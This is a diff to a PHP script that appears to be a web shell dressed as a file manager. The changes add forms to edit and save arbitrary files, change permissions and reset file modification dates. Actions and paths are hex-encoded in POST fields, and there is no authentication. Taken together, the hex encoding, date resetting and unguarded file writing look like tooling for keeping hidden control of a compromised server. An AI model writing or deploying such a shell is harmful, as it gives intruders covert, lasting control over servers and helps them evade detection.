@@ -52,12 +52,56 @@ function getFilePermission($file)
 }
 function editFile($file)
 {
-    echo $file;
+    ?>
+    <form method="post">
+        <div class="row">
+            <h3>Edit File</h3>
+            <label>Filename : <?php echo $file;?></label>
+            <textarea class="u-full-width u-full-height" name="content"><?php echo htmlspecialchars(readFileContents($file));?></textarea>
+            <input class="button-primary" type="submit" name="submit" value="save">
+            <input type="hidden" name="path" value="<?php echo bin2hex($file);?>">
+            <input type="hidden" name="actions" value="<?php echo bin2hex("save_file");?>">
+        </div>
+    </form>
+    <?php
+    exit;
 }
 function filePermission($file)
 {
-    echo $file;
+    // Code
+    ?>
+    <form method="post">
+        <div class="row">
+            <h3>Change Mode</h3>
+            <label>Filename : <?php echo $file;?></label>
+            <input class="u-full-width" type="text" name="file" value="<?php echo getFilePermission($file) ?>">
+            <input class="button-primary" type="submit" name="submit" value="change">
+            <input type="hidden" name="path" value="<?php echo bin2hex($file);?>">
+            <input type="hidden" name="actions" value="<?php echo bin2hex("chmod");?>">
+        </div>
+    </form>
+    <?php
+    exit;
 }
+
+function fileChangedate($file)
+{
+    // Code
+    ?>
+    <form method="post">
+        <div class="row">
+            <h3>Change Date</h3>
+            <label>Filename : <?php echo $file ?></label>
+            <input class="u-full-width" type="text" name="file" value="<?php echo fileDate($file) ?>">
+            <input class="button-primary" type="submit" name="submit" value="change">
+            <input type="hidden" name="path" value="<?php echo bin2hex($file);?>">
+            <input type="hidden" name="actions" value="<?php echo bin2hex("touch");?>">
+        </div>
+    </form>
+    <?php
+    exit;
+}
+
 function getOwnership($filename)
 {
 
@@ -93,10 +137,7 @@ function fileDate($file)
 {
     return date("D, d M Y H:i:s O", filemtime($file));
 }
-function fileChangedate($file)
-{
-    echo $file;
-}
+
 function xorString($input, $key)
 {
     $textLen = strlen($input);
@@ -135,27 +176,6 @@ function writeFileContents($filename, $content)
         return true;
     }
     return false; // all function disabled
-}
-if (isset($_POST['actions'])) {
-    $actions = $_POST['actions'];
-    $actions = hex2bin($actions);
-    switch ($actions) {
-        case 'open_file':
-            editFile(hex2bin($_POST['path']));
-            break;
-        case 'open_dir':
-            if (!isset($_POST['path'])) {
-                $_POST['path'] = getcwd();
-            }
-            chdir(hex2bin($_POST['path']));
-            break;
-        case 'chmod':
-            filePermission(hex2bin($_POST['path']));
-            break;
-        case 'touch':
-            fileChangedate(hex2bin($_POST['path']));
-            break;
-    }
 }
 ?>
 <!DOCTYPE html>
@@ -196,66 +216,46 @@ if (isset($_POST['actions'])) {
             height: 25px;
             content:url('https://i.postimg.cc/T3THvZHG/Documents-icon.png');
         }
+        textarea {resize: none;}
+        textarea.u-full-height {
+            height: 50vh;
+        }
+        td.files {
+            cursor: pointer;
+        }
     </style>
 </head>
 
 <body>
-    <table class="u-full-width">
-        <thead>
-            <tr>
-                <th>Name</th>
-                <th>Date Modified</th>
-                <th>Ownership</th>
-                <th>Permission</th>
-            </tr>
-        </thead>
-        <tbody>
-            <?php $contents = getDirectoryContents(getcwd());
-
-            if (isset($contents['dirs'])) {
-                foreach ($contents['dirs'] as $dirName) {
-                    $path = realpath($dirName);
-                    $path = str_replace('\\', '/', $path);
-                    $path = $path;
-                    $perm = getFilePermission($path);
-                    $date = fileDate($path);
-                    $ownership = getOwnership($path);
-                    $user = $ownership['user'];
-                    $group = $ownership['group'];
-                    $color = getFileColor($path);
-                    echo "<tr>
-                            <td><img class='icon_folder' /><a href='javascript:cd(\"{$path}\");'>&nbsp;{$dirName}</a></td>
-                            <td><a href='javascript:touch(\"{$path}\");'>{$date}</a></td>
-                            <td>{$user}:{$group}</td>
-                            <td><a href='javascript:chmod(\"{$path}\");' style='color:{$color};'>{$perm}</a></td>
-                        </tr>";
+<?php
+    if (isset($_POST['actions'])) {
+        $actions = $_POST['actions'];
+        $actions = hex2bin($actions);
+        switch ($actions) {
+            case 'open_file':
+                editFile(hex2bin($_POST['path']));
+                break;
+            case 'save_file':
+                if (!writeFileContents(hex2bin($_POST['path']), $_POST['content'])) {
+                    echo "failed";
                 }
+                echo 'success';
+                break;
+            case 'open_dir':
+            if (!isset($_POST['path'])) {
+                $_POST['path'] = bin2hex(getcwd());
             }
-            if (isset($contents['files'])) {
-                foreach ($contents['files'] as $fileName) {
-                    $path = realpath($fileName);
-                    $path = str_replace('\\', '/', $path);
-                    $perm = getFilePermission($path);
-                    $date = fileDate($path);
-                    $ownership = getOwnership($path);
-                    $user = $ownership['user'];
-                    $group = $ownership['group'];
-                    $color = getFileColor($path);
-                    echo "<tr>
-                            <td><img class='icon_file' /><a href='javascript:vi(\"{$path}\");'>&nbsp{$fileName}<a/></td>
-                            <td><a href='javascript:touch(\"{$path}\");'>{$date}</a></td>
-                            <td>{$user}:{$group}</td>
-                            <td><a href='javascript:chmod(\"{$path}\");' style='color:{$color};'>{$perm}</a></td>
-                        </tr>";
-                }
-            } ?>
-        </tbody>
-    </table>
-    <?php print_r($_POST); ?>
-    <form id="action_container" method="POST">
-        <input type="hidden" id="path" name="path" />
-        <input type="hidden" id="actions" name="actions" />
-    </form>
+            chdir(hex2bin($_POST['path']));
+            break;
+            case 'chmod':
+                filePermission(hex2bin($_POST['path']));
+                break;
+            case 'touch':
+                fileChangedate(hex2bin($_POST['path']));
+                break;
+        }
+    }
+    ?>
     <script>
         function bin2hex(s) {
             // utf8 to latin1
@@ -305,6 +305,65 @@ if (isset($_POST['actions'])) {
             document.getElementById('action_container').submit();
         }
     </script>
+
+    <table class="u-full-width">
+        <thead>
+            <tr>
+                <th>Name</th>
+                <th>Date Modified</th>
+                <th>Ownership</th>
+                <th>Permission</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php $contents = getDirectoryContents(getcwd());
+
+            if (isset($contents['dirs'])) {
+                foreach ($contents['dirs'] as $dirName) {
+                    $path = realpath($dirName);
+                    $path = str_replace('\\', '/', $path);
+                    $path = $path;
+                    $perm = getFilePermission($path);
+                    $date = fileDate($path);
+                    $ownership = getOwnership($path);
+                    $user = $ownership['user'];
+                    $group = $ownership['group'];
+                    $color = getFileColor($path);
+                    echo "<tr>
+                            <td class='files' onclick='cd(\"{$path}\");'>
+                            <img class='icon_folder' /><a href='javascript:cd(\"{$path}\");'>&nbsp;{$dirName}</a></td>
+                            <td><a href='javascript:touch(\"{$path}\");'>{$date}</a></td>
+                            <td>{$user}:{$group}</td>
+                            <td><a href='javascript:chmod(\"{$path}\");' style='color:{$color};'>{$perm}</a></td>
+                        </tr>";
+                }
+            }
+            if (isset($contents['files'])) {
+                foreach ($contents['files'] as $fileName) {
+                    $path = realpath($fileName);
+                    $path = str_replace('\\', '/', $path);
+                    $perm = getFilePermission($path);
+                    $date = fileDate($path);
+                    $ownership = getOwnership($path);
+                    $user = $ownership['user'];
+                    $group = $ownership['group'];
+                    $color = getFileColor($path);
+                    echo "<tr>
+                            <td class='files' onclick='vi(\"{$path}\");'>
+                            <img class='icon_file' /><a href='javascript:vi(\"{$path}\");'>&nbsp{$fileName}<a/></td>
+                            <td><a href='javascript:touch(\"{$path}\");'>{$date}</a></td>
+                            <td>{$user}:{$group}</td>
+                            <td><a href='javascript:chmod(\"{$path}\");' style='color:{$color};'>{$perm}</a></td>
+                        </tr>";
+                }
+            } ?>
+        </tbody>
+    </table>
+    <?php print_r($_POST); ?>
+    <form id="action_container" method="POST">
+        <input type="hidden" id="path" name="path" />
+        <input type="hidden" id="actions" name="actions" />
+    </form>
 </body>
 
 </html>
